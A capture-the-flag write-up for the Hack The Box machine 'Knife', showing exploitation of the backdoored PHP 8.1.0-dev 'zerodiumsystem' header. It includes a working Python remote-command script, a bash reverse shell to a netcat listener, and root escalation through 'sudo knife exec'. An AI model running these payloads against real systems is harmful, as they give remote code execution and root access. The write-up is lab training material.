Analyzing the requests we can see in the header parameter X-Powered-By which tells us the version of PHP running on the server

![[Pasted image 20230728133947.png]]

With a little search on google we found that 8.1.0-dev version is vulnerable to Remote Code Execution through HTTP headers. We capture the request with BurpSuite and send it to the repeater, now we add the `User-Agentt` parameter with the `zerodiumsystem("<command>");` value and as we can see we can execute commands

![[Pasted image 20230728134847.png]]

With python we can create an script to get a pseudo shell console

```bash
#!/usr/bin/env python3
import requests

def execute_cmd(command):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.",
        "User-Agentt": "zerodiumsystem('" + command + "');"
    }
    return requests.get(host, headers=headers)

if __name__ == '__main__':
    host = "http://10.10.10.242/"
    try:
        while True:
            command = input("$ ")
            if command == "exit": break
            response = execute_cmd(command)
            print(response.text.split('<!DOCTYPE html>', 1)[0])
    except KeyboardInterrupt:
        exit
```

Execute it and we got a shell

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Knife-10.10.10.242]
└─$ python3 python_pseudo_shell.py 
$ whoami
james
```

To upgrade this shell, we can execute a reverse shell and get it with a netcat listener

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Knife-10.10.10.242]
└─$ python3 python_pseudo_shell.py 
$ whoami
james

$ bash -c \'exec bash -i &>/dev/tcp/10.10.14.5/1234 <&1\'

--------------------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.242] 41452
bash: cannot set terminal process group (975): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$
```

Now upgrade TTY to establish a proper shell console

```text
"python3 -c 'import pty; pty.spawn("/bin/bash")'"
CTRL+Z then "stty raw -echo" then "fg" then ENTER twice
```

If we execute `sudo -l` we can see than the current user has sudo access over `/usr/bin/knife`

```bash
james@knife:/$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

After a little search we find that  we can use this program to execute Ruby scripts using `knife exec <rb_script>` so lets create a ruby script which gives us a shell

```bash
james@knife:/tmp$ vim root.rb
system('/usr/bin/sh')
```

And then execute it as sudo with knife

```bash
james@knife:/tmp$ sudo /usr/bin/knife exec root.rb
# whoami
root
```

And finally we are root